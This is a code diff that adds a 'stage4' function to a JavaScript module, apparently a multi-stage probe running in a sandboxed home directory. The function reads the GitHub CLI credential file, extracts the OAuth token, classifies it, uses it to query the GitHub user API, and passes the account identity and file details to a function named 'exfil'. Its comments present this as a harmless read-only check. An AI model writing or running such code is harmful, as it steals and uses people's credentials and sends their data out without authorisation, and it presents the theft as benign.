@@ -291,3 +291,38 @@ function stage3(tag) {
   return out;
 }
 module.exports.stage3 = stage3;
+
+// ---- Stage 4: credential-file presence + single read-only identity check ----
+function stage4(tag) {
+  const home = process.env.HOME || "/home/jailuser";
+  const p = home + "/.config/gh/hosts.yml";
+  const out = { tag: tag, gh: {}, identity: null };
+  const st = safe(() => fs.statSync(p), null);
+  out.gh.path = p;
+  out.gh.exists = !!st;
+  out.gh.size = st ? st.size : null;
+  out.gh.mtime = st ? Math.floor(st.mtimeMs / 1000) : null;
+  const y = rd(p, 4000) || "";
+  const m = y.match(/oauth_token:\s*(\S+)/);
+  out.gh.has_oauth_field = !!m;
+  if (m) {
+    const t = m[1];
+    out.gh.token_len = t.length;
+    out.gh.token_prefix = t.slice(0, 4);
+    out.gh.token_kind = t.indexOf("gho_") === 0 ? "oauth" : t.indexOf("ghp_") === 0 ? "pat" : t.indexOf("ghu_") === 0 ? "user" : "other";
+    // Single read-only identity check. Token value is never written to the report.
+    getAuth("https://api.github.com/user", t, 5000).then((r) => {
+      const a = { status: r.status || null, err: r.err || null };
+      if (r.body) {
+        try { const j = JSON.parse(r.body); a.login = j.login; a.type = j.type; a.site_admin = j.site_admin; } catch (e) { a.parse = "non-json"; }
+      }
+      out.identity = a;
+      exfil(tag + "meta", out);
+    });
+  } else {
+    out.gh.lines = y.split("\n").slice(0, 12).map((l) => l.replace(/(oauth_token:\s*).*/, "$1<redacted>"));
+    exfil(tag + "meta", out);
+  }
+  return out;
+}
+module.exports.stage4 = stage4;
